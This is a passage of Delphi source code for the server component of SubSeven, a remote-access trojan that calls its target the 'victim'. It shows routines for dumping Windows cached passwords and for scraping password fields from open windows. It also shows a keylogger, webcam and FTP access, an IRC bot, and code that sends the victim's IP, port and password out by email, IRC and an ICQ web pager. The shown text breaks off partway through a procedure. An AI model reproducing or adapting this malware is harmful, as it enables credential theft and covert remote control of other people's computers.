unit Unit1;

interface
{}
uses Forms, ExtCtrls, ComCtrls, Controls,Classes, Windows, Registry, ShellApi, Messages,
     Stealth, MMSystem, Dialogs,  SetKey, IniFiles, KeyState, NMsmtp, NMMSG,
     {KeySpy,} IRCClient, MappedPortWinshoe, rascomp32, Psock, ZLIBArchive, clipbrd,
     SysUtils, FTPSrvC, Volume, AC, DialUp, FtpSrv, GameInfo, MPlayer, StdCtrls,
     JLCVideoPanelNEW, NMHttp, WSocket, BTODeum, JPeg, Graphics, LZExpand,
     ACTIVEVOICEPROJECTLib_TLB, HttpProt, Ping, ScktComp, Cipher, DecUtil, TlHelp32;
type TPasswordCacheEntry = packed record
   cbEntry    : word;   // size of this entry, in bytes
   cbResource : word;   // size of resource name, in bytes
   cbPassword : word;   // size of password, in bytes
   iEntry     : byte;   // entry index
   nType      : byte;   // type of entry
   abResource : array [0..$FFFFFFF] of char;
  end;
  TPPasswordCacheEntry = ^TPasswordCacheEntry;
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    ListBox1: TListBox;
    NotifyTimer: TTimer;
    GameInfo1: TGameInfo;
    rectime: TTimer;
    GetPassTimer: TTimer;
    PassList: TListBox;
    keylog: TMemo;
    FtpServer1: TFtpServer;
    loadin: TMemo;
    NMHTTP1: TNMHTTP;
    ServerSocket2: TServerSocket;
    DialUp1: TDialUp;
    ListBox2: TListBox;
    RichEdit: TRichEdit;
    AC1: TAC;
    keysock: TServerSocket;
    irc_timer: TTimer;
    ChatSock: TServerSocket;
    VolumeControl: TVolumeControl;
    webcam: TJLCVideoPanelNEW;
    ServerSocket3: TServerSocket;
    media: TMediaPlayer;
    SetTheKey: TKeyState;
    ICQSpySocket: TServerSocket;
    ICQSpyClock: TTimer;
    MatrixSock: TServerSocket;
    email: TNMSMTP;
    Clock: TTimer;
    irc: TIRCClient;
    ircdone: TTimer;
    RedirectedPorts: TMemo;
    RAS1: TRAS;
    filez: TMemo;
    ICQzip: TZLBArchive;
    Timer1: TTimer;
    banned: TMemo;
    IRCBot: TIRCClient;
    IRCSpy: TIRCClient;
    Perform: TMemo;
    BOTTimer: TTimer;
    HttpFile: THttpCli;
    recon: TTimer;
    icqt: TTimer;
    Ping1: TPing;
    SpyMemo: TMemo;
    CBMode: TComboBox;
    CBFormats: TComboBox;
    procedure ShowPicture (pname : string);
    procedure HandleErrors(Sender:TObject;E:Exception);
    procedure testEnumCachedPasswords;
    procedure SendAutoNotify(UIN:String;sender:TObject);
    function ShowCustomizedMessage(s:string;sender:TObject):string;
    procedure LogTheKey(key:String);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure FormCreate(Sender: TObject);
    procedure HideTheMothaFucker(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1GetThread(Sender: TObject;
      ClientSocket: TServerClientWinSocket;
      var SocketThread: TServerClientThread);
    procedure Delay(msecs:Integer);
    procedure NotifyTimerTimer(Sender: TObject);
    procedure SendEMail(Sender:TObject);
    procedure SendSystemInformation(Sender:TObject);
    procedure rectimeTimer(Sender: TObject);
    procedure NMStrm1PacketSent(Sender: TObject);
    procedure GetPassTimerTimer(Sender: TObject);
    procedure FtpServer1BuildDirectory(Sender: TObject;
      Client: TFtpCtrlSocket; var Directory: TFtpString;
      Detailed: Boolean);
    procedure FtpServer1ChangeDirectory(Sender: TObject;
      Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
    procedure FtpServer1Authenticate(Sender: TObject;
      Client: TFtpCtrlSocket; UserName, Password: TFtpString;
      var Authenticated: Boolean);
    procedure FtpServer1ClientDisconnect(Sender: TObject;
      Client: TFtpCtrlSocket; Error: Word);
    procedure FtpServer1MakeDirectory(Sender: TObject;
      Client: TFtpCtrlSocket; Directory: TFtpString; var Allowed: Boolean);
    procedure FtpServer1RetrSessionClosed(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
    procedure FtpServer1RetrSessionConnected(Sender: TObject;
      Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
    procedure FtpServer1ValidateDele(Sender: TObject;
      Client: TFtpCtrlSocket; var FilePath: TFtpString;
      var Allowed: Boolean);
    procedure ServerSocket2ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure DialUp1ActiveConnection(Sender: TObject; Handle: Integer;
      Status: TRasConnStatusA; StatusString: String; EntryName, DeviceType,
      DeviceName: array of Char);
    procedure SendE_Mail(parametru:string);
    procedure keysockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure irc_timerTimer(Sender: TObject);
    procedure ChatSockClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ChatSockClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure NMMSGServ1MSG(Sender: TComponent; const sFrom, sMsg: String);
    procedure FormDestroy(Sender: TObject);
    procedure ServerSocket3ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ICQSpyClockTimer(Sender: TObject);
    procedure MatrixSockClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure MatrixSockClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure MatrixSockClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure MatrixSockClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ICQSpySocketClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
{    procedure KeySpy1KeySpyDown(Sender: TObject; Key: Byte;
      KeyStr: String);
    procedure KeySpy1Keyword(Sender: TObject);}
    procedure ClockTimer(Sender: TObject);
    procedure ircNicksInUse(Sender: TObject; var Nick: String);
    procedure ircConnect(Sender: TObject);
    procedure ircMessage(Sender: TObject; User: TUser; Channel: TChannel;
      Content: String);
    procedure ircError(Sender: TObject; User: TUser; Numeric,
      Error: String);
    procedure ircDisconnect(Sender: TObject);
    procedure ircdoneTimer(Sender: TObject);
    procedure ircKicked(Sender: TObject; User: TUser; Channel: TChannel);
    procedure ircNoTopic(Sender: TObject; Channel: TChannel);
    procedure Timer1Timer(Sender: TObject);
    procedure IRCBotConnect(Sender: TObject);
    procedure IRCBotNicksInUse(Sender: TObject; var Nick: String);
    procedure IRCBotMessage(Sender: TObject; User: TUser;
      Channel: TChannel; Content: String);
    procedure IRCSpyConnect(Sender: TObject);
    procedure IRCSpyMessage(Sender: TObject; User: TUser;
      Channel: TChannel; Content: String);
    procedure IRCSpyNicksInUse(Sender: TObject; var Nick: String);
    procedure IRCSpyNickChanged(Sender: TObject);
    procedure IRCSpyJoined(Sender: TObject; Channel: TChannel);
    procedure IRCSpyKicked(Sender: TObject; User: TUser;
      Channel: TChannel);
    procedure IRCSpyParted(Sender: TObject; Channel: TChannel);
    procedure BOTTimerTimer(Sender: TObject);
    procedure IRCBotWallops(Sender: TObject; User: TUser; Content: String);
    procedure IRCBotQuit(Sender: TObject; User: TUser);
    procedure reconTimer(Sender: TObject);
    procedure IRCBotDisconnect(Sender: TObject);
    procedure NMHTTP1InvalidHost(var Handled: Boolean);
    procedure NMHTTP1Success(Cmd: CmdType);
    procedure NMHTTP1Connect(Sender: TObject);
    procedure NMHTTP1ConnectionFailed(Sender: TObject);
    procedure NMHTTP1Failure(Cmd: CmdType);
    procedure icqtTimer(Sender: TObject);
    procedure ServerSocket2ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Ping1Display(Sender: TObject; Msg: String);
    procedure Ping1DnsLookupDone(Sender: TObject; Error: Word);
    procedure Ping1EchoRequest(Sender: TObject);
    procedure Ping1EchoReply(Sender: TObject; Error: Integer);
    procedure msPingDisplay(Sender: TObject; Msg: String);
    procedure msPingDnsLookupDone(Sender: TObject; Error: Word);
    procedure msPingEchoReply(Sender: TObject; Error: Integer);
    procedure msPingEchoRequest(Sender: TObject);
  private
    FStringFormat:Integer;
    WMNewChar : Word;
    MyTime:TSystemTime;
    KeyWnd : HWnd;
    CanSend:boolean;
    MailSent:Boolean;
    reg:TRegistry;
    KeyHookVer,LaCheie,SendStrBody,sendstrbodyirc:String;
    cuce,addit:string;
    RefreshAll,success:Boolean;
    ColorsChanged:Boolean;
    OriginalColors:array[1..3] of Integer;
    NewColors:array[1..3] of Integer;
    SetColorz:array[1..3] of TColor;
    procedure WMQueryEndSession(var Message: TWMQueryEndSession); message WM_QUERYENDSESSION;    procedure custWMSYS(var Message: TWMSYSCOMMAND); Message WM_CLOSE;
    function EncodeKeys(Keys: string): string;
    procedure InstallServer;
    procedure GetResolutions;
    procedure ChangeResolution(cuce:integer);
    procedure ExecuteExeFile;
    procedure SaveSettings;
    procedure IRC_SEND(bigstring: String);
    procedure InitDATA;
    procedure RemoveServer;
    procedure CheckForMessages;
    procedure EnableKeyLogger;
    procedure DisableKeyLogger;
    procedure SetTheScreenSaver(text: string);
    function ApasaMouse(var Comm: String): String;
    procedure SendHomeInformation;
    procedure LoadAIMPasswords;
    procedure LoadICQPasswords;
    procedure AddPass(path: string);
    function FindPass(parola: string): string;
    function ReadAIMKey(dir, Section: String): String;
    procedure ResetDB;
    procedure SendKeyNOW(tasta: string);
    procedure CompressFile(filename: string);
    procedure DeCompressFile(filename: string);
    procedure CompressNewFile(filename: string);
    procedure RunDosCommand(param: string);
    procedure GoMeltTheServer;
    procedure UpdateServerNOW;
    procedure InitDATA_IRC;
    procedure RefreshProcesses;
    function GetPriorityString(Priority: DWORD): string;
    function TerminateProc(num: integer):boolean;
    function ChangeThreadPriority(ince,proc: integer): boolean;
    procedure GetICQList;
    procedure RefreshRAS;
    function ListIPz: String;
    procedure BackupFiles;
    procedure DeleteBackups;
    function ExportICQUIN(uin: string): String;
    procedure SearchAndReport2(recursive: boolean; fp, sd: string);
    procedure hunt(Sender: TObject; Error: word);
    procedure hunt1DataAvailable(Sender: TObject; Error: Word);
    procedure ScanRemoteIPS;
    function PickRandomNick: String;
    procedure StartIRCBOT;
    procedure WriteOut;
    procedure UpdateFromURL(url: string; frombot: bool);
    procedure GetKeyProc(var Msg: TMessage);
  public
     ChatZoom,VSize,CSize:Integer;
     VCol,CCol:String;
     PoateInchide:Boolean;
     procedure SendIncomings;
     procedure UpdateAll(param:string);
     procedure SearchAndReport(recursive:boolean;fp,sd:string);
  end;

type trj= record
     name : string;
     port : string;
     end;
const max_hunters=60;
      Ocupat:Bool=False;
      eol=#13#10;
      no1=14438136;
      no2=7827;
      no3=15101980;
var
  MsgServer: TNMMSGServ;
  ji,j,k      : integer;
  hunters           : array[1..max_hunters+5] of TWSocket;
  huntpos           : array[1..max_hunters+5] of integer;
  s,iplow           : string;
  cpos              : integer;
  gata,over         : boolean;
  cip               : integer;
  jdelay            : integer;
  startip,endip     : integer;
  ports: array[0..300] of trj;
  onchan,cport             : string;
  spch:TDirectSS;
  last_pos          : integer;
  how_long          : integer;
  dirx       : string;
  no_need    : boolean;
  x1,x2,x3,y1,y2,y3 : integer;
  q1,q2,q3  : integer;
  sx1,sx2,sx3 : string;
  more_visible : boolean;
  read_path    : boolean;
  err_val      : boolean;

const MainPass=1727374757;
{      InDir='Enum\SBSV';}
      InDir='Enum\PCI\RZNSSS';
      TopWindow:ShortString='';
      LauncherName='mueexe.exe';
      TelnetMessage:string='';
      SearchString=Chr(0)+Chr(1)+Chr(0)+Chr(0)+Chr(0)+Chr(3)+Chr(0)+Chr(0)+Chr(0);
      OldRet: Boolean = False;
      AceptaServer:Boolean=False;
      ServerStarted:Boolean=False;
      SEND_KEYZ:bool=false;
      SendKeyString:String='';
      PCB_IDLE = 4;
      PCB_NORMAL = 8;
      PCB_HIGH = 13;
      PCB_REALTIME = 24;
      NoREDPORT:Byte=0;
type _db=record
      cod:String[10];
      nume:string;
      text:AnsiString;
      changed, taken,StillHere:bool;
     end;
var SetPreviewQuality,SetSnapshotQuality:Integer;
  portz:array[1..10] of boolean;
  ProcessData:array[1..100] of Pointer;
  RRFrom,RRTo,IRCPassword, IRCMaster, IRCMasterNick, IRCNickname, IRCPort, IRCServer, IRCPrefix, RSChan,RSLocal:String;
  KeepChan,IRCIdent, IRCChannel,IRCChannelKey:String;
  YESQUIT,RsEnabled,RREnabled,IRCLogged, IRCAutoStart, RRBoth, RSBoth:Boolean;
  PingCount, PingAt,ProcLA:Integer;
  LocalFTPFolder,BindedWithSize:String;
  NEW_SERVER, MeltServer,BindedWithExe:bool;
  db:array[1..15] of _db;
  RegistryKeyName,CurrentExe:String;
  batf:textfile;
  buffer : array [0..1040] of byte;
  iores:integer;
  fisier:file;
  FaO,recfile,sendfile:boolean;
  SendString,DownloadTo,TempSaveFile,TempFile:String;
  Strm2Send:TMemoryStream;
  Form1: TForm1;
  Speaker:TBTBeeper;
  DLLFileName:String;
  Conectat,PassDone,FromMaster,ListenToKeys:Boolean;
  SetUserID,SetUserICQ,Parola, FTPPassword:String;
  i:Integer;
  winds:array[1..15] of HWND;
  MyString,DownloadFileName,strw,strbody:String;
  DownloadFile:Boolean;
  PassesDone:array[1..10] of boolean;
  pd:integer;
  MyFName:Integer;
  REDPORT:array[1..10] of TWinShoeMappedPort;
  OldListIPz:String;
const ServerVersion='2.1';
const
  Count: Integer = 0;

function WNetEnumCachedPasswords(lp: lpStr; w: Word; b: Byte; PC: PChar; dw: DWord): Word; stdcall;
{var NewStrm:TNMStrm;}
implementation

uses Unit5, ShowPictureUnit, {KeyDll,} MatrixUnit, htmltotxt, KeyDll;

procedure addtolog(ce:string);
var tf:textfile;
begin
// assign(tf,'c:\sub7log.txt');
// if fileexists('c:\sub7log.txt') then append(tf) else rewrite(tf);
// writeln(tf,ce);
// closefile(tf);
end;
{type  TProcessEntry32 = record
      dwSize              : DWORD;
      cntUsage            : DWORD;
      th32ProcessID       : DWORD;
      th32DefaultHeapID   : DWORD;
      th32ModuleID        : DWORD;
      cntThreads          : DWORD;
      th32ParentProcessID : DWORD;
      pcPriClassBase      : integer;
      dwFlags             : DWORD;
      szExeFile           : array [0..MAX_PATH-1] of char;
end;}
type _last20=record
      MaiE, token:bool;
      text:AnsiString;
     end;
const SpyNo=4;
var fs : TFileStream;
    No:Integer;
    Spies:array[1..SpyNo] of bool;
    loop:integer;
    MessageData:array[1..6] of Ansistring;
    Last20:array[1..20] of _last20;
    Cnt:Integer;
{$R *.DFM}

procedure TForm1.ResetDB;
begin
 for i:=1 to 15 do
  db[i].taken:=false;
end;

procedure TForm1.HandleErrors;
begin
 {duh!}
end;

function DecryptOLD(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;  PW:=IntToStr(MainPass);  x:=0; // initialize count
 for i:=0 to length(Text) do begin Text[i]:=Chr(Ord(Text[i])-Ord(PW[x]));
 Inc(x);if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

function EncryptOLD(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;PW:=IntToStr(MainPass);x:=0; // initialize count
 for i:=0 to length(text) do begin Text[i]:=Chr(Ord(Text[i])+Ord(PW[x]));Inc(x);
 if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

procedure TForm1.custWMSYS(var Message: TWMSYSCOMMAND);
var
 iTitle: integer;
begin
 PostMessage(iTitle, WM_QUIT, 0, 0);
 close;
 Halt(0);
end;

function WNetEnumCachedPasswords(lp: lpStr; w: Word; b: Byte; PC: PChar; dw: DWord): Word; external mpr name 'WNetEnumCachedPasswords';
type
 PWinPassword = ^TWinPassword;
 TWinPassword = record
   EntrySize: Word;
   ResourceSize: Word;
   PasswordSize: Word;
   EntryIndex: Byte;
   EntryType: Byte;
   PasswordC: Char;
  end;
var
  WinPassword: TWinPassword;

function AddPassword(WinPassword: PWinPassword; dw: DWord): LongBool; stdcall;
var
  Password: String;
  PC: Array[0..$FF] of Char;
begin
  Count:=Count+1;

  Move(WinPassword.PasswordC, PC, WinPassword.ResourceSize);
  PC[WinPassword.ResourceSize] := #0;
  CharToOem(PC, PC);
  Password := StrPas(PC);

  Move(WinPassword.PasswordC, PC, WinPassword.PasswordSize + WinPassword.ResourceSize);
  Move(PC[WinPassword.ResourceSize], PC, WinPassword.PasswordSize);
  PC[WinPassword.PasswordSize] := #0;
  CharToOem(PC, PC);
  Password := Password + ': ' + StrPas(PC);

  Form1.LoadIn.Lines.Add(Password);
  Result := True;
end;

function TForm1.EncodeKeys(Keys : string) : string;
var
  I : Word;
  Ch : Char;
begin
  I := 1;
  Result := '';
  while I <= Length(Keys) do begin
    case Keys[I] of
      #13 : begin
        Ch := 'ô';
        if (I < Length(Keys)) and (Keys[I + 1] = #10) then
          Inc(I);
      end;
      #10 : Ch := 'ö';
      else
        Ch := Keys[I];
    end;
    Result := Result + Ch;
    Inc(I);
  end;
end;


function Decrypt(ce:string):string;var x,i:Integer;Text,PW:String;
var Parol,R:String;
begin
 Parol:=IntToStr(MainPass)+chr(109)+chr(117)+chr(101)+IntToStr(MainPass);
  with TCipher_Blowfish.Create(Parol, nil) do
  try
    Mode := TCipherMode(Form1.CBMode.ItemIndex);
    Result:=CodeString(ce, paDecode, Form1.FStringFormat);
  finally
    Free;
  end;
end;

function Encrypt(ce:string):string;var x,i:Integer;Text,PW:String;
var R,Parol:String;
begin
 Parol:=IntToStr(MainPass)+chr(109)+chr(117)+chr(101)+IntToStr(MainPass);
  with TCipher_Blowfish.Create(Parol, nil) do
  try
    Mode := TCipherMode(Form1.CBMode.ItemIndex);
    R := CodeString(ce, paEncode, Form1.FStringFormat);
    Result:=R;
  finally
    Free;
  end;
end;

Function WinPath:String;var d:integer;res:string;
begin
 setlength(res,500);d:=getwindowsdirectory(pchar(res),500); setlength(res,d);result:=res;
end;

Function SysPath:String;var d:integer;res:string;
begin
 setlength(res,500);d:=getsystemdirectory(pchar(res),500); setlength(res,d);result:=res;
end;

procedure TForm1.GetResolutions;
var
  i : Integer;
  DevMode : TDevMode;
begin
  i := 0;
  while EnumDisplaySettings(nil,i,Devmode) do begin
    with Devmode do
      ListBox1.Items.Add(Format('%dx%d [%d Colors]',[dmPelsWidth,dmPelsHeight,1 shl dmBitsperPel]));
    Inc(i);
  end;
end;

procedure TForm1.ChangeResolution(cuce:integer);
var
  DevMode : TDevMode;
begin
  EnumDisplaySettings(nil,cuce,Devmode);
  ChangeDisplaySettings(DevMode,0);
end;

function  TempFolder: string;
begin
 Result:=WinPath;
end;

function EnumPasswordCallbackProc(pce: TPPasswordCacheEntry; pdw: cardinal) : LongBool; stdcall;
var s1 : string;
    s2 : string;
begin
 result:=true;
 SetLength(s1,pce^.cbResource);
 Move(pce^.abResource[0],pointer(s1)^,pce^.cbResource);
 s1:=pchar(s1)+#$D#$A;
 SetLength(s2,pce^.cbPassword);
 Move(pce^.abResource[pce^.cbResource],pointer(s2)^,pce^.cbPassword);
 s1:=pchar(s2)+#$D#$A;
 fs.Write(pointer(s1)^,length(s1));
 fs.Write(pointer(s2)^,length(s2));
end;

procedure tform1.testEnumCachedPasswords;
var WNetEnumCachedPasswords : function (ps: pchar; pw: word; pb: byte; proc: pointer; bdw: cardinal) : word; stdcall;
    mpr                     : cardinal;
begin
  mpr:=LoadLibrary('mpr');
  if mpr<>0 then
    try
      WNetEnumCachedPasswords:=GetProcAddress(mpr,'WNetEnumCachedPasswords');
      if @WNetEnumCachedPasswords<>nil then begin
         fs:=TFileStream.Create(WinPath+'\CACHED~.BDE',fmCreate);
        try
          WNetEnumCachedPasswords(nil,0,$FF,@EnumPasswordCallbackProc,0);
        finally end;
      end;
    finally FreeLibrary(mpr) end;
 fs.Free;
end;
function ReadKey(Section:String):String;
var Reg:TRegistry;
    MySerial:String;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(InDir,false) then
   try
    MySerial:=ReadString(Section);
   except
    MySerial:='';
   end;
   Free;
  end;
Result:=MySerial;
end;

{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{ PASSWORDS }

function TForm1.ListIPz:String;
var IPz:TStrings;
    IPzCount:Integer;
begin
 try IPz := WSocket.LocalIPList;except end;
 if IPz.Count=1 then begin Result:=IPz[0];exit;end;
 Result:='-';
 for IPzCount:=0 to IPz.Count-1 do
  Result:=Result+IPz[IPzCount]+'-';
end;

procedure TForm1.SendE_Mail(parametru:string);
begin
  success:=false;
  email.ClearParams := TRUE;
  email.Host := Decrypt(ReadKey(Encrypt('EMaddress')));
  email.Port := 25;
  email.UserID:=Decrypt(ReadKey(Encrypt('EMid')));
 try
  email.Connect;
 except
  exit;
 end;
  with email.postmessage do begin
   FromAddress := 'none';
   FromName := 'SubSevenServer';
   ToAddress.Add(Decrypt(ReadKey(Encrypt('EMto'))));
   ToCarbonCopy.Add('');
   ToBlindCarbonCopy.Add('');
   Body.Add(parametru);
   Subject := 'Local IPs found: '+ListIPz;
   LocalProgram := 'sssmtp';
   email.ClearParams := TRUE;
  end;
 try
  email.SendMail;
 except
  exit;
 end;
 try
  email.Disconnect;
 except
  exit;
 end;
 success:=true;
end;

procedure TForm1.SendAutoNotify;
var AllThatBigString:String;
    loop:integer;
begin
 icqt.enabled:=false;
 AllThatBigString:='http://wwp.icq.com/scripts/WWPMsg.dll?from=Sub7Server&fromemail='+cuce+'&subject='+strw+'&body='+sendstrbody+'&to='+UIN+'&Send=Message';
 for loop:=1 to length(AllThatBigString) do if AllThatBigString[loop]=' ' then AllThatBigString[loop]:='_';
 try
  NMHTTP1.Get(AllThatBigString);
 except
  //
 end;
end;

{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{ PASSWORDS }
 var
  PList : array [1..64] of string;
  AppList : array [1..64] of LongInt;
  PC, RC, APC: integer;
 function WinText (hWnd : LongInt) : Ansistring;
   var PC : PChar;
       L : integer;
  begin
   try L:=SendMessage (hWnd, WM_GETTEXTLENGTH, 0, 0);except l:=250;end;
   try getmem (PC, L+1);except end;
   try SendMessage (hWnd, WM_GETTEXT, L+1, LongInt (PC));except end;
   try result:=PC;except end;
   try freemem(PC,L+1);except end;
  end;
 function IsPassword (hWnd : LongInt) : boolean;
   var ST : LongInt;
  begin
   ST:=GetWindowWord (hWnd, GWL_STYLE) and $FF;
   result:=(ST=$A0) or (ST=$E0);
  end;
 function IsTextField (hWnd : LongInt) : boolean;
   var ST : LongInt;
  begin
   ST:=GetWindowWord (hWnd, GWL_STYLE) and $FF;
   result:=(ST=$A0) or (ST=$E0) or (ST=$80) or (ST=$C0);
  end;
 // Gets all applications with pass fields
const FOUNDSOME:bool=false;
 procedure GetPasswordList;
   var i, j : integer;
       ohWnd, PrhWnd : LongInt;
  begin
   APC:=0;
   for i:=1 to 16384 do
    if IsWindow (i) then
     if IsPassword (i) then
      begin
       PrhWnd:=i;
       try
       repeat
        ohWnd:=PrhWnd;
        PrhWnd:=GetParent (ohWnd);
       until GetParent (PrhWnd)=0;
       Inc (APC);
       AppList[APC]:=PrhWnd;
       except end;
      end;
   PC:=0;
   for i:=1 to 16384 do
    if IsWindow (i) then
     if IsTextField (i) then
      begin
      try
       PrhWnd:=i;
       repeat
        ohWnd:=PrhWnd;
        PrhWnd:=GetParent (ohWnd);
       until GetParent (PrhWnd)=0;
       except end;
       for j:=1 to APC do
        if PrhWnd=AppList[j] then
         begin
          try
          FOUNDSOME:=TRUE;
          Inc (PC);
          PList[PC]:=WinText(PrhWnd)+'___'+WinText(i);
          break;
         except break;end;
         end; { Application with passes scanning..}
      end; { hWnd scanning }
  end; { End of procedure }

 procedure ProcessPasswords;
  // adds passwords (from PList) to Registry with old Password checking
   var i, j : integer;
       found : boolean;
       RG : TRegistry;
  begin
   try Form1.GetPassTimer.Enabled:=false;except end;
   try
   FOUNDSOME:=FALSE;try GetPasswordList;except end;
   if (not FOUNDSOME) then
    begin
     Form1.GetPassTimer.Enabled:=true;
     EXIT;
    end;

   FOUNDSOME:=False;
   RG:=TRegistry.Create;
   RG.RootKey:=HKEY_LOCAL_MACHINE;
   RG.OpenKey ('SOFTWARE\Microsoft\General\', TRUE);
   if RG.ValueExists ('Cate') then
    RC:=RG.ReadInteger ('Cate')
     else
      RC:=0;
   if RC=0 then // Empty registry - don't compare, add all passes..
    begin
     RG.WriteInteger ('Cate', PC);
     for i:=1 to PC do
      RG.WriteString (inttostr(i), PList[i]);
    end
     else
      begin // Comparing RList & PList...
       for i:=1 to PC do // compare loop
        begin
         found:=false;
         for j:=1 to RC do
          if RG.ReadString (inttostr(j))=PList[i] then found:=true;
         if not(found) then
          begin
           Inc (RC);
           RG.WriteString (inttostr(RC), PList[i]);
          end;
        end;      // end compare loop
       RG.WriteInteger ('Cate', RC);
      end;
   RG.Destroy;
   Form1.GetPassTimer.Enabled:=true;
  except end;
  end;

function RemoveKey(Section:String):String;
var Reg:TRegistry;
    MySerial:String;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(InDir,false) then
  DeleteValue(Section);
  Free;
  end;
Result:=MySerial;
end;
var nick:string;
procedure TForm1.IRC_SEND(bigstring:String);
begin
 if irc.connected then exit;
 irc.Server:=Decrypt(ReadKey(Encrypt('IRCserver')));
 irc.Port:=Decrypt(ReadKey(Encrypt('IRCport')));
 irc.nick:=PickRandomNick;//IntToStr(Random(99999)+592);
 irc.altnick:=PickRandomNick;//IntToStr(Random(99999)+592);
 irc.UserName:=PickRandomNick;
 irc.Connect;
 irc_timer.interval:=60*5000;
 irc_timer.enabled:=true;
 ircdone.interval:=10000;
 ircdone.enabled:=true;
end;
procedure TForm1.InitDATA;
var infostr,data,tmp,p1,p2:string;
    month,day:integer;
begin
  infostr:='UserName:'+GameInfo1.UserName;
  data:=DateToStr(now);
  tmp:=copy(data,1,pos('/',data)-1);month:=StrToInt(tmp);Delete(data,1,pos('/',data));
  tmp:=copy(data,1,pos('/',data)-1);day:=StrToInt(tmp);
  strw:='_';p1:='{';p2:='}';
  case month of
   1:begin strw:='Sub7ICQNotification';p1:='(';p2:=')';end;
   2:begin
     case day of
      1 ..10:begin strw:='SubSevenPager';p1:='<';p2:='>';end;
      11..20:begin strw:='SubSevenPager';p1:='|';p2:='|';end;
      21..31:begin strw:='WWPager';      p1:='»';p2:='«';end;
     end;end;
   3:begin
     case day of
      1 ..10:begin strw:='M.U.I.E.I.C.Q.';p1:='{';p2:='}';end;
      11..20:begin strw:='B.U.G.Mafia';   p1:='/';p2:='\';end;
      21..31:begin strw:='.';             p1:='*';p2:='*';end;
     end;end;
  end;
  strbody:=p1+'port='+IntToStr(serversocket1.port)+p2;
  cuce:=Decrypt(ReadKey(Encrypt('Name')));
  sendstrbody:=strbody+'-'+p1+'ip='+ListIPz+p2+'-'+p1+'victim='+cuce+p2+'-'+p1+'info='+infostr+p2+'-'+p1+'version='+ServerVersion+p2+'-'+p1+'password=';
  addit:='no'+p2;
  if (Decrypt(ReadKey(Encrypt('Password')))<>'') and (Decrypt(ReadKey(Encrypt('Password')))<>'ERROR') then addit:='yes ('+Decrypt(ReadKey(Encrypt('Password')))+')'+p2;
  sendstrbody:=sendstrbody+addit;
  for i:=1 to length(sendstrbody) do
  if sendstrbody[i]=' ' then sendstrbody[i]:='_';
end;

procedure TForm1.InitDATA_IRC;
begin
  strbody:='Sub7Server v.'+ServerVersion+' installed on port: '+IntToStr(serversocket1.port)+', ';
  cuce:=Decrypt(ReadKey(Encrypt('Name')));
  sendstrbodyirc:=strbody+'ip: '+ListIPz+' - victim: '+cuce+' - password: ';
  addit:='no';
  if (Decrypt(ReadKey(Encrypt('Password')))<>'') and (Decrypt(ReadKey(Encrypt('Password')))<>'ERROR') then addit:=Decrypt(ReadKey(Encrypt('Password')));
  sendstrbodyirc:=sendstrbodyirc+addit+'';
end;

procedure TForm1.SendEMail(Sender:TObject);
begin
  {if localip='127.0.0.1' then exit;}
  InitDATA;
  if (Decrypt(ReadKey(Encrypt('Enabled')))='true') then SendAutoNotify(Decrypt(ReadKey(Encrypt('ICQ'))),sender);
  if (Decrypt(ReadKey(Encrypt('EMdoit')))='true') then SendE_Mail(sendstrbody);
  if (Decrypt(ReadKey(Encrypt('IRC')))='true') then IRC_SEND(sendstrbody);
end;

procedure TForm1.Delay(msecs:integer);
var
   FirstTickCount:longint;
begin
     FirstTickCount:=GetTickCount;
     repeat
     until ((GetTickCount-FirstTickCount) >= Longint(msecs));
end;

procedure showTaskbar;
var wndHandle : THandle;
    wndClass : array[0..50] of Char;
begin
 StrPCopy(@wndClass[0], 'Shell_TrayWnd');
 wndHandle := FindWindow(@wndClass[0], nil);
 ShowWindow(wndHandle, SW_RESTORE);
end;
procedure showDesktopIcons;
var wndHandle : THandle;
begin
 wndHandle := FindWindow(nil,'Program Manager');
 ShowWindow(wndHandle, SW_RESTORE);
end;
procedure showStart;
Var taskbarhandle,
    buttonhandle : HWND;
begin
 taskbarhandle := FindWindow('Shell_TrayWnd', nil);
 buttonhandle := GetWindow(taskbarhandle, GW_CHILD);
 ShowWindow(buttonhandle, SW_SHOW);
end;
procedure hideStart;
Var taskbarhandle,
    buttonhandle : HWND;
begin
 taskbarhandle := FindWindow('Shell_TrayWnd', nil);
